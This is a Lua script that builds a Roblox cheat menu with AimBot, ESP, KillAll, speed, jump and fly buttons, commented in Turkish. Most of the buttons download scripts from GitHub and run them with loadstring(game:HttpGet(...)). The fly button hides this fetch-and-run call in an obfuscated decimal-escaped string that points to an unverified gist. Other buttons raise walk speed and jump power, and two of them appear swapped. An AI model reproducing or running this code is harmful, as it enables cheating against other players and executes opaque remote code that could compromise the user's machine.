-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton2 = Instance.new("TextButton")
local TextButton3 = Instance.new("TextButton")
local TextButton = Instance.new("TextButton")
local TextButton6 = Instance.new("TextButton")
local TextButton5 = Instance.new("TextButton")
local TextButton4 = Instance.new("TextButton")
local TextButton8 = Instance.new("TextButton")
local TextButton7 = Instance.new("TextButton")
local TextButton9 = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.349069148, 0, 0.270731717, 0)
Frame.Size = UDim2.new(0, 520, 0, 309)
Frame.Style = Enum.FrameStyle.RobloxRound

TextButton2.Name = "TextButton2"
TextButton2.Parent = ScreenGui
TextButton2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton2.BorderSizePixel = 0
TextButton2.Position = UDim2.new(0.434175521, 0, 0.269512206, 0)
TextButton2.Size = UDim2.new(0, 128, 0, 53)
TextButton2.Style = Enum.ButtonStyle.RobloxRoundButton
TextButton2.Font = Enum.Font.SourceSans
TextButton2.Text = "Player"
TextButton2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton2.TextScaled = true
TextButton2.TextSize = 49.000
TextButton2.TextWrapped = true

TextButton3.Name = "TextButton3"
TextButton3.Parent = ScreenGui
TextButton3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton3.BorderSizePixel = 0
TextButton3.Position = UDim2.new(0.65558517, 0, 0.269512206, 0)
TextButton3.Size = UDim2.new(0, 58, 0, 53)
TextButton3.Style = Enum.ButtonStyle.RobloxRoundButton
TextButton3.Font = Enum.Font.SourceSans
TextButton3.Text = "X"
TextButton3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton3.TextScaled = true
TextButton3.TextSize = 49.000
TextButton3.TextWrapped = true

TextButton.Parent = ScreenGui
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.349069148, 0, 0.269512206, 0)
TextButton.Size = UDim2.new(0, 128, 0, 53)
TextButton.Style = Enum.ButtonStyle.RobloxRoundButton
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Gun Games"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 49.000
TextButton.TextWrapped = true

TextButton6.Name = "TextButton6"
TextButton6.Parent = ScreenGui
TextButton6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton6.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton6.BorderSizePixel = 0
TextButton6.Position = UDim2.new(0.519281924, 0, 0.371951222, 0)
TextButton6.Size = UDim2.new(0, 128, 0, 53)
TextButton6.Style = Enum.ButtonStyle.RobloxRoundButton
TextButton6.Font = Enum.Font.SourceSans
TextButton6.Text = "ESP"
TextButton6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton6.TextScaled = true
TextButton6.TextSize = 49.000
TextButton6.TextWrapped = true

TextButton5.Name = "TextButton5"
TextButton5.Parent = ScreenGui
TextButton5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton5.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton5.BorderSizePixel = 0
TextButton5.Position = UDim2.new(0.434175521, 0, 0.371951222, 0)
TextButton5.Size = UDim2.new(0, 128, 0, 53)
TextButton5.Style = Enum.ButtonStyle.RobloxRoundButton
TextButton5.Font = Enum.Font.SourceSans
TextButton5.Text = "Big Paintball 1-2"
TextButton5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton5.TextScaled = true
TextButton5.TextSize = 49.000
TextButton5.TextWrapped = true

TextButton4.Name = "TextButton4"
TextButton4.Parent = ScreenGui
TextButton4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton4.BorderSizePixel = 0
TextButton4.Position = UDim2.new(0.349069148, 0, 0.371951222, 0)
TextButton4.Size = UDim2.new(0, 128, 0, 53)
TextButton4.Style = Enum.ButtonStyle.RobloxRoundButton
TextButton4.Font = Enum.Font.SourceSans
TextButton4.Text = "AimBot"
TextButton4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton4.TextScaled = true
TextButton4.TextSize = 49.000
TextButton4.TextWrapped = true

TextButton8.Name = "TextButton8"
TextButton8.Parent = ScreenGui
TextButton8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton8.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton8.BorderSizePixel = 0
TextButton8.Position = UDim2.new(0.434175521, 0, 0.371951222, 0)
TextButton8.Size = UDim2.new(0, 128, 0, 53)
TextButton8.Style = Enum.ButtonStyle.RobloxRoundButton
TextButton8.Font = Enum.Font.SourceSans
TextButton8.Text = "Speed"
TextButton8.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton8.TextScaled = true
TextButton8.TextSize = 49.000
TextButton8.TextWrapped = true

TextButton7.Name = "TextButton7"
TextButton7.Parent = ScreenGui
TextButton7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton7.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton7.BorderSizePixel = 0
TextButton7.Position = UDim2.new(0.349069148, 0, 0.371951222, 0)
TextButton7.Size = UDim2.new(0, 128, 0, 53)
TextButton7.Style = Enum.ButtonStyle.RobloxRoundButton
TextButton7.Font = Enum.Font.SourceSans
TextButton7.Text = "Jump"
TextButton7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton7.TextScaled = true
TextButton7.TextSize = 49.000
TextButton7.TextWrapped = true

TextButton9.Name = "TextButton9"
TextButton9.Parent = ScreenGui
TextButton9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton9.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton9.BorderSizePixel = 0
TextButton9.Position = UDim2.new(0.519281924, 0, 0.371951222, 0)
TextButton9.Size = UDim2.new(0, 128, 0, 53)
TextButton9.Style = Enum.ButtonStyle.RobloxRoundButton
TextButton9.Font = Enum.Font.SourceSans
TextButton9.Text = "Fly"
TextButton9.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton9.TextScaled = true
TextButton9.TextSize = 49.000
TextButton9.TextWrapped = true

-- Scripts:

local function UFPFN_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	local guiParent = script.Parent
	
	-- TextButton'u bul ve onClick event'i ekle
	local textButton = guiParent:FindFirstChild("TextButton3") -- "TextButton3" ismi doğru şekilde belirtilmiş olmalıdır
	
	if textButton then
		textButton.MouseButton1Click:Connect(function()
			-- GUI'yi devre dışı bırakma
			guiParent.Enabled = false
		end)
	else
		warn("TextButton3 bulunamadı veya isim yanlış!")
	end
	
	local guiParent = script.Parent
	
	-- TextButton'u bul ve onClick event'i ekle
	local textButton = guiParent:FindFirstChild("TextButton") -- "TextButton3" ismi doğru şekilde belirtilmiş olmalıdır
	
	if textButton then
		textButton.MouseButton1Click:Connect(function()
			
		end)
	else
		warn("TextButton3 bulunamadı veya isim yanlış!")
	end
end
coroutine.wrap(UFPFN_fake_script)()
local function EYIGQD_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	local guiParent = script.Parent
	
	-- TextButton'u bul ve onClick event'i ekle
	local textButton1 = guiParent:FindFirstChild("TextButton4") -- "TextButton3" ismi doğru şekilde belirtilmiş olmalıdır
	
	if textButton1 then
		textButton1.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/mentosbabapro/a/main/b.lua"))()
		end)
	end
	
	local guiParent = script.Parent
	
	-- TextButton'u bul ve onClick event'i ekle
	local textButton2 = guiParent:FindFirstChild("TextButton5") -- "TextButton3" ismi doğru şekilde belirtilmiş olmalıdır
	
	if textButton2 then
		textButton2.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/WetCheezit/Releases/main/Big-Paintball/KillAll.lua"))()
		end)
	end
	
	local textButton3 = guiParent:FindFirstChild("TextButton6") -- "TextButton3" ismi doğru şekilde belirtilmiş olmalıdır
	
	if textButton3 then
		textButton3.MouseButton1Click:Connect(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/mentosbabapro/a/main/a.lua"))()
		end)
	end
end
coroutine.wrap(EYIGQD_fake_script)()
local function QIRUPI_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	local guiParent = script.Parent
	
	-- TextButton'u bul ve onClick event'i ekle
	local textButton = guiParent:FindFirstChild("TextButton2") -- "TextButton3" ismi doğru şekilde belirtilmiş olmalıdır
	local textButton1 = guiParent:FindFirstChild("TextButton4")
	local textButton2 = guiParent:FindFirstChild("TextButton5")
	local textButton3 = guiParent:FindFirstChild("TextButton6")
	local textButton4 = guiParent:FindFirstChild("TextButton7")
	local textButton5 = guiParent:FindFirstChild("TextButton8")
	local textButton6 = guiParent:FindFirstChild("TextButton9")
	
	if textButton then
		textButton.MouseButton1Click:Connect(function()
			textButton1.Visible = false
			textButton2.Visible = false
			textButton3.Visible = false
			textButton4.Visible = true
			textButton5.Visible = true
			textButton6.Visible = true
		end)
	end
end
coroutine.wrap(QIRUPI_fake_script)()
local function RHNRW_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	local guiParent = script.Parent
	local textButton1 = guiParent:FindFirstChild("TextButton")
	local textButton2 = guiParent:FindFirstChild("TextButton4")
	local textButton3 = guiParent:FindFirstChild("TextButton5")
	local textButton4 = guiParent:FindFirstChild("TextButton6")
	local textButton5 = guiParent:FindFirstChild("TextButton7")
	local textButton6 = guiParent:FindFirstChild("TextButton8")
	local textButton7 = guiParent:FindFirstChild("TextButton9")
	
	if textButton1 then
		textButton1.MouseButton1Click:Connect(function()
			textButton2.Visible = true
			textButton3.Visible = true
			textButton4.Visible = true
			textButton5.Visible = false
			textButton6.Visible = false
			textButton7.Visible = false
		end)
	end
end
coroutine.wrap(RHNRW_fake_script)()
local function ONPATND_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	local guiParent = script.Parent
	
	-- TextButton'u bul ve onClick event'i ekle
	local textButton1 = guiParent:FindFirstChild("TextButton7") -- "TextButton3" ismi doğru şekilde belirtilmiş olmalıdır
	
	if textButton1 then
		textButton1.MouseButton1Click:Connect(function()
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
		end)
	end
	
	local guiParent = script.Parent
	
	-- TextButton'u bul ve onClick event'i ekle
	local textButton2 = guiParent:FindFirstChild("TextButton8") -- "TextButton3" ismi doğru şekilde belirtilmiş olmalıdır
	
	if textButton2 then
		textButton2.MouseButton1Click:Connect(function()
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100
		end)
	end
	
	local textButton3 = guiParent:FindFirstChild("TextButton9") -- "TextButton3" ismi doğru şekilde belirtilmiş olmalıdır
	
	if textButton3 then
		textButton3.MouseButton1Click:Connect(function()
			--[[
		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
	]]
			loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
		end)
	end
end
coroutine.wrap(ONPATND_fake_script)()
